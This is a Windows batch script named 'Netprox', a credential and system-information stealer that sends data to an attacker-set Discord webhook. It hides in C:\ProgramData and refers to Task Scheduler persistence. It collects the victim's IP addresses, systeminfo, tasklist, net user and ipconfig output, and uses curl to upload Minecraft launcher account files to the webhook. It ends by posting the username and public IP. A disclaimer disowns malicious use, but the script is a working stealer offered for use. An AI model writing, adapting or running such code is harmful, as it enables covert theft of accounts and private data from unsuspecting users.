@echo off
title Netprox
color 02
echo #####################
echo Discord: Aabox#0001
echo #####################
:: BY REMOVING THE GOTO(s) YOU AGREE TO NOT USE THE SCRIPT FOR MALICIOUS PURPOSES. THE AUTHOR IS NOT RESPONSIBLE FOR ANY HARM CAUSED BY THE SCRIPT.
:: SOME GOTO(s) ARE NECESSARY, SO WATCH WHAT YOU REMOVE.


:: Path of the hide location - If the path has the user's username, it will not work for those who have a space. Task Scheduler doesn't support that. This is part of the recurring method.
set "vpath=C:\ProgramData"

cd %vpath%

:: If using onlogin on Task Scheduler use this - Might give away your file though - You don't need administrator for anything else currently.
goto skipadministrator
if not "%~dp0"=="%vpath%\" (
	if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
)
:skipadministrator

:: SET WEBHOOK | EDIT TO YOUR OWN WEBHOOK
:: --------------------------------------
set "webhook=YOUR WEBHOOK"

:: GET PRIVATE IP ADDRESS
:: ----------------------
for /f "delims=[] tokens=2" %%a in ('2^>NUL ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a

:: GET PUBLIC IP ADDRESS
:: ---------------------
for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a

:: GET TIME
:: --------
for /f "tokens=1-4 delims=/:." %%a in ("%TIME%") do (
	set HH24=%%a
	set MI=%%b
)

:: SYSTEM INFORMATION - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
:: ------------------------------------------------------------------
	set "tempsys=%appdata%\sysinfo.txt"
	2>NUL SystemInfo > "%tempsys%"
	curl --silent --output /dev/null -F systeminfo=@"%tempsys%" %webhook%
	del "%tempsys%" >nul 2>&1
:skipsysteminfocapture

:: TASK LIST - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
:: ------------------------------------------------------------------
	set "temptasklist=%appdata%\tasklist.txt"
	2>NUL tasklist > "%temptasklist%"
	curl --silent --output /dev/null -F tasks=@"%temptasklist%" %webhook%
	del "%temptasklist%" >nul 2>&1
:skiptasklist

:: NET USER - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
:: ------------------------------------------------------------------

	set "netuser=%appdata%\netuser.txt"
	2>NUL net user > "%netuser%"
	curl --silent --output /dev/null -F tasks=@"%netuser%" %webhook%
	del "%netuser%" >nul 2>&1
:skipnetuser

:: IPCONFIG /ALL - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
:: ------------------------------------------------------------------
	set "ipconfig=%appdata%\ipconfig.txt"
	2>NUL ipconfig /all > "%ipconfig%"
	curl --silent --output /dev/null -F tasks=@"%ipconfig%" %webhook%
	del "%ipconfig%" >nul 2>&1
:skipipconfig

:: MINECRAFT - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
:: ---------------------------------------------------------

	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- MINECRAFT -```\"}"  %webhook%
	curl --silent --output /dev/null -F steamusers=@"%appdata%\.minecraft\launcher_profiles.json" %webhook%
	curl --silent --output /dev/null -F steamusers=@"%appdata%\.minecraft\launcher_accounts.json" %webhook%
	
	timeout /t 2 /nobreak > NUL
:skipminecraft


:: SEND FIRST REPORT MESSAGE WITH SOME INFO
:: ----------------------------------------
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[Report from %USERNAME% - %PublicIP%]\nLocal time: %HH24%:%MI%```\"}"  %webhook%






